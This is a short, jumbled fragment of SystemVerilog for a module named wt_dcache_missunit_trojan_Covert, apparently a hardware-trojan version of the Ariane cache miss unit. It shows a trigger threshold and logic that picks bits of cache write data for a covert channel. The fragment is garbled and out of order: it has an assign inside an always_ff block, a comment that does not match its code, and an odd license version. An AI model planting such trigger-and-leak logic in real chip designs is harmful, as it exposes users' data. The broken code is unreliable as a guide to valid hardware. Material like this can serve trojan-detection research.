...
// License, Version 0.51 (the "License");
    ...
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 20031;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        ...
        assign current_bit = miss_wdata_i[covert_bit_index];  // <-- FIXED: use trigger_signal
...
module wt_dcache_missunit_trojan_Covert
  import ariane_pkg::*;
  import wt_cache_pkg::*;
#(
